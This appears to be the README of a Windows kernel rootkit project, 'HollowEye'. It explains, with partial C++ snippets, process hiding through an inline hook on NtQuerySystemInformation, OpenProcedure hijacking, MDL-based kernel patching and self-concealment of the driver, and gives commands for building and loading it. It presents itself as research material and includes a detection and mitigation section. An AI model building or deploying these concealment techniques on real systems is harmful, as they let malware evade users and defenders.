# HollowEye 👁️

**Windows Kernel-Mode Process Hider & Rootkit**

A sophisticated kernel-mode rootkit demonstrating advanced Windows internals techniques for process hiding, object hooking, and system information filtering. Built for security research and educational purposes.

---

## ⚠️ Disclaimer

**FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY**

This software is provided strictly for:
- Security research and analysis
- Educational demonstrations of Windows kernel internals
- Authorized penetration testing environments
- Antivirus/EDR testing and validation

**DO NOT** use this software on systems you do not own or have explicit permission to test. Unauthorized use of rootkits is illegal and may violate computer fraud and abuse laws. The authors assume no liability for misuse or damage caused by this software.

---

## 📋 Overview

HollowEye is a proof-of-concept Windows kernel driver that demonstrates multiple advanced rootkit techniques:

| Technique | Description |
|-----------|-------------|
| **Process Hiding** | Hides processes from Task Manager, Process Explorer, and API enumeration |
| **SSDT Hooking** | Inline hooks `NtQuerySystemInformation` via MDL-based patching |
| **Object Callback Hooking** | Hijacks `ObjectType.OpenProcedure` for process access denial |
| **Module Concealment** | Removes driver entries from `SystemModuleInformation` |
| **List Manipulation** | Splices process/module linked lists to remove target entries |

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                        USER MODE                            │
│  ┌─────────────────────────────────────────────────────┐    │
│  │           controller.exe                            │    │
│  │  • Opens device handle                              │    │
│  │  • Sends IOCTLs (HIDE/UNHIDE)                       │    │
│  │  • Displays status messages                         │    │
│  └─────────────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────────────┘
                              │
                    DeviceIoControl
                              │
┌─────────────────────────────────────────────────────────────┐
│                      KERNEL MODE                            │
│  ┌─────────────────────────────────────────────────────┐    │
│  │           HollowEye.sys                             │    │
│  │                                                     │    │
│  │  ┌───────────────┐  ┌────────────────────────┐      │    │
│  │  │ IRP Handler   │  │ NtQuerySystemInfo Hook │      │    │
│  │  │ (IOCTL)       │  │ (Inline Detour)        │      │    │
│  │  └───────────────┘  └────────────────────────┘      │    │
│  │                                                     │    │
│  │  ┌───────────────┐  ┌────────────────────────┐      │    │
│  │  │ Process List  │  │ ObjectType OpenProc    │      │    │
│  │  │ Filter        │  │ Hook                   │      │    │
│  │  └───────────────┘  └────────────────────────┘      │    │
│  └─────────────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────────────┘
```

---

## 🔬 Technical Deep Dive

### 1. Process Hiding via `NtQuerySystemInformation` Hook

The driver installs an inline hook (detour) on `NtQuerySystemInformation` in `ntoskrnl.exe`:

```cpp
NTSTATUS NTAPI HookedNtQSI(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength)
{
    // Call original
    NTSTATUS status = g_Rk.OriginalQSI(...);
    
    // Filter results
    if (SystemInformationClass == SystemProcessInformation) {
        FilterProcessList(SystemInformation, actualLength);
    }
    return status;
}
```

The hook uses a 14-byte `jmp [rip+0]` trampoline to redirect execution while preserving the original function in an allocated trampoline buffer.

### 2. Object Callback Hooking

The driver hooks `ObjectType.OpenProcedure` for `PsProcessType` to deny access to the hidden process:

```cpp
NTSTATUS HookedOpenProcedure(...)
{
    if (targetPid == g_Rk.HiddenPid && !IsTrustedCaller()) {
        *GrantedAccess = 0;
        return STATUS_ACCESS_DENIED;
    }
    return g_Rk.OriginalProcessOpenProc(...);
}
```

The hook address is calculated using version-specific offsets:

```cpp
POBJECT_TYPE procType = *PsProcessType;
PVOID* addr = (PVOID*)((BYTE*)procType + TypeInfoOffset + OpenProcOffset);
```

### 3. MDL-Based Memory Patching

Writes to read-only kernel memory are performed via Memory Descriptor Lists (MDLs):

```cpp
PMDL mdl = IoAllocateMdl(targetAddr, size, FALSE, FALSE, nullptr);
MmProbeAndLockPages(mdl, KernelMode, IoWriteAccess);
PVOID mapped = MmMapLockedPagesSpecifyCache(mdl, KernelMode, MmNonCached, ...);
RtlCopyMemory(mapped, patch, size);
```

This technique bypasses standard write protection without modifying CR0.

### 4. Linked List Splicing

To hide processes, the driver manipulates the `SYSTEM_PROCESS_INFORMATION` linked list:

- **First entry**: Copies subsequent entries over the target
- **Middle entry**: Adjusts the previous entry's `NextEntryOffset`
- **Last entry**: Sets previous entry's `NextEntryOffset` to 0

### 5. Driver Concealment

The driver removes its own entry from `SystemModuleInformation`:

```cpp
VOID FilterModuleList(PVOID buffer) {
    for (ULONG i = 0; i < *count; i++) {
        if (imageBase == g_Rk.DriverImageBase) {
            RtlMoveMemory(...);  // Shift remaining entries
            (*count)--;
            break;
        }
    }
}
```

---

## 🚀 Building

### Prerequisites

- **Visual Studio 2019/2022** with C++ Desktop Development
- **Windows Driver Kit (WDK)** 10.0.19041.0 or later
- **Windows SDK** 10.0.19041.0 or later
- **Test Signing Mode** enabled on target machine

### Build Steps

```bash
# 1. Clone the repository
git clone https://github.com/yourusername/HollowEye.git
cd HollowEye

# 2. Open the solution
start HollowEye.sln

# 3. Configure:
#    - Set configuration to "Release" and "x64"
#    - Set driver signing to "Test Sign"

# 4. Build all projects
#    Build → Build Solution (Ctrl+Shift+B)
```

### Outputs

| File | Description |
|------|-------------|
| `HollowEye.sys` | Kernel driver |
| `controller.exe` | User-mode control utility |
| `HollowEye.cer` | Test signing certificate |

---

## 🔧 Usage

### Loading the Driver

```powershell
# Enable test signing (requires reboot)
bcdedit /set testsigning on

# Create and start the service
sc create HollowEye type= kernel binPath= "C:\path\to\HollowEye.sys"
sc start HollowEye
```

### Hiding a Process

```powershell
# Hide a process by PID
controller.exe hide 1234

# Example: Hide notepad
notepad.exe &
controller.exe hide (Get-Process notepad).Id
```

### Unhiding

```powershell
controller.exe unhide
```

### Unloading

```powershell
sc stop HollowEye
sc delete HollowEye
```

---

## 📊 Supported Windows Versions

| Version | Build | Status |
|---------|-------|--------|
| Windows 10 1909 | 18363 | ✅ Supported |
| Windows 10 20H1 | 19041 | ✅ Supported |
| Windows 10 20H2 | 19042 | ✅ Supported |
| Windows 10 21H1 | 19043 | ✅ Supported |
| Windows 10 21H2 | 19044 | ✅ Supported |
| Windows 10 22H2 | 19045 | ✅ Supported |
| Windows 11 21H2 | 22000 | ✅ Supported |
| Windows 11 22H2 | 22621 | ✅ Supported |
| Windows 11 23H2 | 22631 | ✅ Supported |
| Windows 11 24H2 | 26100 | ✅ Supported |

> **Note:** Offset tables may require updates for newer builds. The driver uses a version-matching table with fallback to safe defaults.

---

## 🛡️ Detection & Mitigation

This project serves as a learning tool for defenders. Common detection vectors include:

### Detection Methods

1. **Cross-View Analysis**: Compare results from `NtQuerySystemInformation` with EPROCESS linked lists
2. **Kernel Callback Registration**: Use `PsSetCreateProcessNotifyRoutineEx` for process events
3. **Integrity Checks**: Verify `NtQuerySystemInformation` prologue bytes against known-good
4. **Object Directory Enumeration**: Query `\Device` and `\ObjectTypes` directly
5. **ETW Providers**: Monitor `Microsoft-Windows-Kernel-Process` events
6. **HVCI/Credential Guard**: Hardware-enforced code integrity blocks kernel patching
7. **PatchGuard**: Monitors critical kernel structures (SSDT, IDT, MSRs)

### Mitigations

- Enable **Secure Boot** and **HVCI**
- Keep **PatchGuard** enabled
- Use **Credential Guard**
- Monitor kernel memory integrity

---

## 🔍 Key Implementation Details

### IOCTL Interface

```cpp
#define RK_CTL_HIDE    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define RK_CTL_UNHIDE  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
```

### Version-Aware Offset Resolution

```cpp
static VersionOffsets g_OffsetTable[] = {
    { 19041, 0x40, 0x38 },  // _OBJECT_TYPE.TypeInfo @ 0x40
    { 22000, 0x40, 0x38 },  // _OBJECT_TYPE.OpenProcedure @ 0x38
    // ...
};
```

### Protected Caller Check

```cpp
HANDLE callerPid = PsGetCurrentProcessId();
if (callerPid != (HANDLE)4 && callerPid != g_Rk.DriverOwnerPid) {
    *GrantedAccess = 0;
    return STATUS_ACCESS_DENIED;
}
```

---

## 🧪 Testing Checklist

- [ ] Process hidden from Task Manager
- [ ] Process hidden from Process Explorer
- [ ] Process hidden from `Get-Process` (PowerShell)
- [ ] Process hidden from `CreateToolhelp32Snapshot`
- [ ] Driver hidden from `driverquery`
- [ ] Hidden process cannot be opened by other processes
- [ ] Unhide restores visibility
- [ ] Driver unloads cleanly
- [ ] System remains stable after operations

---

## 🤝 Contributing

Contributions are welcome for **defensive research** and **educational improvements**:

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/detection-improvement`)
3. Commit changes (`git commit -m 'Add new detection vector'`)
4. Push (`git push origin feature/detection-improvement`)
5. Open a Pull Request

---

## 📚 References & Further Reading

- [Windows Internals, 7th Edition](https://www.microsoftpressstore.com/store/windows-internals-part-1-system-architecture-processes-9780735684188) — Russinovich, Ionescu, Solomon
- [Rootkits: Subverting the Windows Kernel](https://www.amazon.com/Rootkits-Subverting-Windows-Greg-Hoglund/dp/0321294319) — Hoglund & Butler
- [Practical Reverse Engineering](https://www.wiley.com/en-us/Practical+Reverse+Engineering%3A+x86%2C+x64%2C+ARM%2C+Windows+Kernel%2C+Reversing+Tools%2C+and+Obfuscation-p-9781118787311) — Dang, Gazet, Bachaalany
- [Windows Kernel Programming](https://leanpub.com/windowskernelprogramming) — Pavel Yosifovich
- [Microsoft Docs: Object Manager](https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/object-manager)
- [Microsoft Docs: MDLs](https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/using-mdls)

---

<div align="center">

**Developed By Exp**

</div>